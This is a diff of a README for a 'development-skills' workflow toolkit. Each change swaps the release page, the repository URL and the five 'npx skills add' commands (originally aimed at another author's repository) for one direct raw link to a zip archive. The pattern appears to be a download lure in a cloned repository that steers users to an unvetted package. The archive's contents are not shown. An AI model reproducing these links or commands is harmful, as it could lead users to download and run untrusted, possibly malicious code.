@@ -1,6 +1,6 @@
 # ⚙️ development-skills - Simplify Your Software Workflow
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/marcellotibial471/development-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip)
 
 ## 📋 About development-skills
 
@@ -20,11 +20,11 @@ Each part works as a skill you can use when handling your software projects.
 
 ## 🌐 Download development-skills
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/marcellotibial471/development-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip)
 
 You can visit the release page to download the package. The download page has the latest version available. You will get all the tools to start using these skills.
 
-**Link:** [https://github.com/marcellotibial471/development-skills/releases](https://github.com/marcellotibial471/development-skills/releases)
+**Link:** [https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip](https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to download and use development-skills on your Windows comput
 
 Open your web browser. Visit the release page:
 
-https://github.com/marcellotibial471/development-skills/releases
+https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip
 
 This page lists all available versions.
 
@@ -101,11 +101,11 @@ development-skills supports two methods for adding the skills if you use develop
 If you have `skills.sh`, you can add each skill individually with these commands:
 
 ```bash
-npx skills add https://github.com/SimpleEve/development-skills --skill spec
-npx skills add https://github.com/SimpleEve/development-skills --skill plan
-npx skills add https://github.com/SimpleEve/development-skills --skill implement
-npx skills add https://github.com/SimpleEve/development-skills --skill review
-npx skills add https://github.com/SimpleEve/development-skills --skill test
+npx skills add https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip --skill spec
+npx skills add https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip --skill plan
+npx skills add https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip --skill implement
+npx skills add https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip --skill review
+npx skills add https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip --skill test
 ```
 
 ### Option B: Use Claude Code Plugin
@@ -153,7 +153,7 @@ Each part works together to keep your project on track.
 
 development-skills is available on GitHub with an open-source license. You can review the code or contribute if you want.
 
-Repository URL: https://github.com/marcellotibial471/development-skills
+Repository URL: https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip
 
 ---
 
@@ -169,4 +169,4 @@ development-skills simplifies the software process by using clear steps anyone c
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/marcellotibial471/development-skills/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/marcellotibial471/development-skills/main/review/skills-development-3.0.zip)
